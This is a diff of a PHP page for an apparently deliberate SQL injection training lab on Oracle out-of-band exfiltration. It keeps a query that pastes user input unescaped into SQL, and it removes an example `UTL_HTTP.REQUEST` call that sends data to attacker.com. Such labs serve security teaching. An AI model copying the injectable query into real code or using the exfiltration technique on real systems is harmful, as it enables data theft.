@@ -4,24 +4,22 @@ $mode = $_GET['mode'] ?? 'black';
 $verify_error = null;
 
 /* Flag verification */
-if (isset($_POST['flag_input'])) {
-    $submitted = trim($_POST['flag_input']);
-    if ($submitted === 'FLAG{or_utl_http_00b}') {
+if (isset($_POST['flag'])) {
+    $submitted = trim($_POST['flag']);
+    $flag_sql = "SELECT secret FROM oob_secrets WHERE id=1";
+    $flag_stmt = oci_parse($conn, $flag_sql);
+    oci_execute($flag_stmt);
+    $flag_row = oci_fetch_assoc($flag_stmt);
+    if ($flag_row && $submitted === $flag_row['SECRET']) {
         $_SESSION['oracle_lab9_solved'] = true;
-        header("Location: " . url_lab_from_slug("oracle/lab9", $mode));
+        header("Location: " . url_lab_from_slug("oracle/lab9", $mode, $_GET['ref'] ?? ''));
         exit;
     } else {
-        $verify_error = "Incorrect flag. Keep trying!";
+        $verify_error = "Incorrect. Keep trying!";
     }
 }
 ?>
 
-<?php if (!empty($driver_missing)): ?>
-<div class="result-warning result-box" style="margin-bottom:16px;">
-    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
-    Query construction shown for learning. Install the driver for live execution.
-</div>
-<?php endif; ?>
 
 <!-- Lab Description -->
 <div class="card">
@@ -29,20 +27,12 @@ if (isset($_POST['flag_input'])) {
 
     <h4>Scenario</h4>
     <p>
-        This document search application is truly blind: identical responses, no errors,
-        and time-based techniques are blocked by query timeouts. The intended attack vector
-        is <strong>Out-of-Band (OOB) exfiltration</strong> using <code>UTL_HTTP.REQUEST()</code>,
+        A document search application is truly blind: identical responses, no errors, and
+        time-based techniques are blocked by query timeouts. The intended attack vector is
+        <strong>Out-of-Band (OOB) exfiltration</strong> using <code>UTL_HTTP.REQUEST()</code>,
         which makes the Oracle database send an HTTP request to an attacker-controlled server
         with the stolen data embedded in the URL.
     </p>
-    <p><strong>Oracle Concepts:</strong> <code>UTL_HTTP.REQUEST('http://attacker.com/' || data)</code>
-    causes Oracle to make an outbound HTTP request. The stolen data is appended to the URL
-    and captured on the attacker's server. Requires <code>EXECUTE</code> on <code>UTL_HTTP</code>
-    and network ACL permissions.</p>
-    <p><strong>Table Schema:</strong> <code>documents(id NUMBER, title VARCHAR2, author VARCHAR2, content CLOB)</code></p>
-    <p><strong>Hidden Table:</strong> <code>oob_secrets(id NUMBER, secret VARCHAR2)</code></p>
-    <p><em>Note: For this lab, use error-based extraction (CAST) to retrieve the flag.
-    The solution explains the full OOB technique conceptually.</em></p>
 
     <h4>Objective</h4>
     <p>
@@ -64,7 +54,7 @@ if (isset($_POST['flag_input'])) {
 <div class="card">
     <h4>Submit Flag</h4>
     <form method="POST" class="form-row">
-        <input type="text" name="flag_input" class="input" placeholder="FLAG{...}" required>
+        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
         <button type="submit" class="btn btn-primary">Verify</button>
     </form>
 
@@ -100,7 +90,7 @@ if (isset($_POST['author'])) {
     $input = $_POST['author'];
     $query = "SELECT id, title, author FROM documents WHERE author = '$input'";
 
-    echo '<div class="terminal">';
+    echo '<div class="terminal query-output">';
     echo '<div class="terminal-header">';
     echo '<span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>';
     echo '<span class="terminal-title">Oracle Query</span>';
@@ -137,8 +127,8 @@ if (isset($_POST['author'])) {
         }
 }
     } else {
-        echo '<div class="result-warning result-box">';
-        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the OCI8 driver for live results.';
+        echo '<div class="result-error result-box">';
+        echo '<strong>Error:</strong> Database connection failed. Is the Oracle container running?';
         echo '</div>';
     }
 }
